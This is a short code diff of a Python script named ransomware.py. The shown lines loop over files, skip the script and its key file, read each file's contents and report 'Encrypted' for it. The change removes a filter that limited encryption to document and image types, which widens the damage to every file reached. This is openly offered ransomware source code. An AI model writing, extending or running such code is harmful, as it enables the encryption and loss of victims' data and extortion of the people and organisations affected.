@@ -25,9 +25,6 @@ if __name__ == "__main__":
         filename = os.path.basename(file)
         if filename in ("ransomware.py", "key.key"):
             continue
-        # Optional: only encrypt specific file types
-        if not file.endswith(('.txt', '.pdf', '.docx', '.jpg', '.png')):
-            continue
         try:
             with open(file, "rb") as thefile:
                 contents = thefile.read()
@@ -37,3 +34,4 @@ if __name__ == "__main__":
             print(f"Encrypted {file}")
         except Exception as e:
             print(f"Failed to encrypt {file}: {e}")
+
